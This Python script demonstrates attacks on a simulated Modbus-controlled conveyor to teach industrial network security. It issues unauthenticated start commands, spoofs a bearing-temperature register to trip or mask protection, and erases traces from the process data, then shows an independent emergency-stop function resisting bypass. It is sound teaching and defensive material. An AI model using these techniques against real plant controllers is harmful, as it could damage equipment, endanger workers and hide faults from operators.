#!/usr/bin/env python3
"""
Three things an unauthenticated Modbus client can do to CONV-001 — and one
it cannot.

    # terminal 1
    python3 plant/gateway/modbus_server.py --port 15020
    # terminal 2
    python3 plant/gateway/attack_demo.py --port 15020

No credential is supplied anywhere in this file, because the protocol has
nowhere to put one. That is not an oversight in Modbus; it is Modbus.
Published in 1979 for a serial link between two boxes in one cabinet, it
was never wrong — the network arrived afterwards.

The fourth scenario is the one that matters. It is why ADR-011 exists.
"""

from __future__ import annotations

import argparse
import sys
import time
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent))

from modbus import Client  # noqa: E402

COIL_START, COIL_STOP = 0, 1
COIL_ESTOP_A, COIL_ESTOP_B = 2, 3
COIL_RESET = 4
COIL_RUNNING, COIL_TRIPPED = 5, 6
HR_BEARING_TEMP = 0

OK, BAD = "✓", "✗"


def banner(n: int, title: str, technique: str) -> None:
    print(f"\n{'=' * 74}\n  {n}. {title}\n     {technique}\n{'=' * 74}")


def state(c: Client) -> tuple[bool, bool, float]:
    co = c.read_coils(0, 8)
    hr = c.read_holding(0, 5)
    return co[COIL_RUNNING], co[COIL_TRIPPED], hr[0] / 10.0


def show(c: Client, label: str) -> None:
    run, trip, temp = state(c)
    print(f"     {label:<34} motor={'RUNNING' if run else 'stopped':<8} "
          f"safety={'TRIPPED' if trip else 'ok':<8} bearing={temp:5.1f} C")


def settle(c: Client, n: int = 4) -> None:
    time.sleep(n * 0.25)


def main(host: str, port: int) -> int:
    c = Client(host, port)
    if not c.connect():
        print(f"could not connect to {host}:{port} — is the server running?")
        return 2

    print(f"\nConnected to CONV-001 at {host}:{port}.")
    print("No username. No password. No certificate. No session. None exist.")
    failures = 0

    # -- 0. get the plant running, as an operator would ---------------------
    c.write_coil(COIL_RESET, True); settle(c)
    c.write_coil(COIL_RESET, False)
    c.write_coil(COIL_START, True); settle(c, 8)
    show(c, "baseline, belt started")
    run, _, _ = state(c)
    if not run:
        print("     fixture failure: the belt did not start")
        return 2

    # -- 1. start the conveyor ----------------------------------------------
    banner(1, "Start the conveyor from anywhere on the network",
           "ATT&CK for ICS: unauthorised command message")
    c.write_coil(COIL_STOP, True); settle(c, 6)
    c.write_coil(COIL_STOP, False)
    show(c, "operator stopped it")
    c.write_coil(COIL_START, True); settle(c, 8)
    show(c, "we started it again")
    run, _, _ = state(c)
    print(f"     {OK if run else BAD} a write to coil 0 is a write to coil 0. The PLC cannot")
    print("       tell us from the SCADA system, because the protocol carries no")
    print("       identity for it to compare.")
    failures += 0 if run else 1

    # -- 2. spoof a sensor ---------------------------------------------------
    banner(2, "Defeat machine protection by lying about a sensor",
           "ATT&CK for ICS: spoof reporting message")
    show(c, "before")
    c.write_register(HR_BEARING_TEMP, 990)      # 99.0 C — above the 95 C trip
    settle(c, 6)
    show(c, "after writing 99.0 C to register 0")
    run, _, _ = state(c)
    print(f"     {OK if not run else BAD} the control function tripped on a temperature that does not")
    print("       exist. It believed its input, which is the only thing a PLC can do.")
    print("       Run this the other way — hold a REAL overheating bearing at 40 C —")
    print("       and the machine is destroyed while the HMI shows green.")
    failures += 0 if not run else 1

    # -- 3. hide the state ---------------------------------------------------
    banner(3, "Restore the value and restart, leaving no trace in the process data",
           "ATT&CK for ICS: modify parameter")
    c.write_register(HR_BEARING_TEMP, 400)
    c.write_coil(COIL_STOP, True); settle(c, 4)
    c.write_coil(COIL_STOP, False)
    c.write_coil(COIL_START, True); settle(c, 8)
    show(c, "restored and restarted")
    print(f"     {OK} nothing in the register block now records that any of this")
    print("       happened. Detection has to come from somewhere other than the")
    print("       process values — which is what S6 and S24 are for.")

    # -- 4. the one that fails ----------------------------------------------
    banner(4, "Now try to keep the belt running through an emergency stop",
           "This is the one that does not work, and the reason ADR-011 exists")
    show(c, "belt running, start still held")
    c.write_coil(COIL_ESTOP_A, False)
    c.write_coil(COIL_ESTOP_B, False)
    c.write_coil(COIL_START, True)          # hold the run command asserted
    settle(c, 8)
    show(c, "e-stop demanded, start STILL held")
    run, trip, _ = state(c)
    stopped_and_latched = (not run) and trip
    print(f"     {OK if stopped_and_latched else BAD} the belt stopped and the trip LATCHED, while we held the")
    print("       run command asserted the whole time.")
    failures += 0 if stopped_and_latched else 1

    c.write_coil(COIL_ESTOP_A, True)
    c.write_coil(COIL_ESTOP_B, True)
    c.write_coil(COIL_START, True); settle(c, 8)
    show(c, "demand cleared, start held")
    run, trip, _ = state(c)
    still_down = (not run) and trip
    print(f"     {OK if still_down else BAD} clearing the demand did not restart it either. The trip needs")
    print("       a manual reset at the panel, and we are not at the panel.")
    failures += 0 if still_down else 1

    print(f"""
{'=' * 74}
  WHAT THIS DEMONSTRATES
{'=' * 74}

  Scenarios 1 to 3 succeed completely, and none of them is fixable in the
  PLC program. Modbus authenticates nothing, so the only remaining control
  is WHO CAN REACH THE PORT AT ALL.

      In OT, the segmentation IS the authentication.

  That one sentence is why FR5 restricted data flow outweighs
  confidentiality in IEC 62443, why a conduit is a first-class object with
  its own target security level rather than "a firewall rule", and why
  CRS-011 in the hydro assessment requires the write allow-list to be
  enforced AT THE CONTROLLER and not in the HMI's tag database.

  Scenario 4 fails, and it fails for a different kind of reason. The safety
  function has no network input at all — no remote reset, no SCADA write,
  no bypass bit, no maintenance mode. Its independence does not depend on
  the segmentation holding, which is the only property in this plant that
  survives an adversary who is already inside.

  That is what ADR-011 buys, and it is why the safety function stays narrow:
  every demand added to it is another way for it to trip spuriously, and a
  safety function that trips for reasons operations do not respect is one
  that ends up bypassed.
""")

    c.close()
    if failures:
        print(f"  {BAD} {failures} scenario(s) behaved unexpectedly — investigate before trusting this demo.\n")
        return 1
    print("  All four scenarios behaved as documented.\n")
    return 0


if __name__ == "__main__":
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=15020)
    a = ap.parse_args()
    sys.exit(main(a.host, a.port))
